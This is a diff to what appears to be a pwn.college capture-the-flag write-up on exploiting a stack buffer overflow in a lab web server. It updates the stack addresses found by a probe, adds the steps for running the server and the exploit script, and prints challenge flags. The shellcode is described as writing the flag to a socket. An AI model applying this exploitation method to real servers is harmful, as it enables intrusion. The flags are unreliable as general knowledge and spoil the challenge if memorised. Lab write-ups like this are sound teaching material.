@@ -2563,6 +2563,8 @@ pwn.college{wj1Qz7XQTeBxj6-rTwrVdzyrKNU.QXyYDMxEDL4ITM0EzW}
 
 ## Wily Webserver
 
+### Binary analysis
+
 ```
 hacker@integrated-security~integration-web-overflow:~$ checksec /challenge/integration-web-overflow
 [*] '/challenge/integration-web-overflow'
@@ -2840,12 +2842,12 @@ hacker@integrated-security~wily-webserver:~$ gcc -O0 -no-pie -fno-stack-protecto
 ./probe
 ./probe
 ./probe
-content[0] = 0x7fffffff9a08
-ret addr slot = 0x7fffffffba18
-content[0] = 0x7fffffff9a08
-ret addr slot = 0x7fffffffba18
-content[0] = 0x7fffffff9a08
-ret addr slot = 0x7fffffffba18
+content[0] = 0x7fffffffa728
+ret addr slot = 0x7fffffffc738
+content[0] = 0x7fffffffa728
+ret addr slot = 0x7fffffffc738
+content[0] = 0x7fffffffa728
+ret addr slot = 0x7fffffffc738
 ```
 
 Three consistent runs give `content[0] = 0x7fffffffa728`. The address the probe prints is the address of `content[0]` in the real binary — not just the probe's own stack — because by constructing the identical chain of frame sizes on the same deterministic stack base, we arrive at the identical position.
@@ -2949,11 +2951,19 @@ if m:
     print(f'[+] FLAG: {m.group(0).decode()}')
 ```
 
+Run the server in one terminal, and the script in another.
+
 ```
+hacker@integrated-security~wily-webserver:~$ /challenge/integration-web-overflow
+Listening on port 80.
+```
+
+```
+hacker@integrated-security~wily-webserver:~$ python ~/script.py
 [+] FLAG: pwn.college{IfJLlBKNExRa6KcB0xygNI4ERm8.QXzYDMxEDL4ITM0EzW}
 ```
 
-The response is 8373 bytes — 8313 from the normal HTTP response path, plus 60 bytes appended by the shellcode writing the flag directly to fd 4 after `ret`.
+The response is 8373 bytes: 8313 from the normal HTTP response path, plus 60 bytes appended by the shellcode writing the flag directly to fd 4 after `ret`.
 
 &nbsp;
 
